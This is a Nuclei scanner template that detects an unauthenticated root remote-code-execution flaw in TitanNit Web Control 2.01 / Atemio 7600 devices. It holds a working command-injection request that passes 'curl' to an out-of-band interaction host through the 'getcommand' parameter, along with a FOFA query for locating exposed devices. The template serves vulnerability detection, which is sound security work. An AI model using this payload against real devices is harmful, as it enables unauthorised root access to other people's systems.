http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: body
    type: word
    words:
    - titan.css
  matchers-condition: and
  raw:
  - '@timeout: 20s

    GET /query?getcommand=&cmd=curl+http://{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    '
id: titannit-web-rce
info:
  author: DhiyaneshDk
  description: 'The vulnerability in the device enables an unauthorized attacker to
    execute system commands with elevated privileges. This exploit is facilitated
    through the use of the ''getcommand'' query within the application,allowing the
    attacker to gain root access.

    '
  metadata:
    fofa-query: title="TitanNit Web Control"
    max-request: 1
    verified: true
  name: TitanNit Web Control 2.01/Atemio 7600 Root - Remote Code Execution
  reference:
  - https://www.exploit-db.com/exploits/51853
  - https://github.com/projectdiscovery/nuclei-templates/issues/8716
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5801.php
  severity: high
  tags: titanit,web-control,ssrf,oast,rce
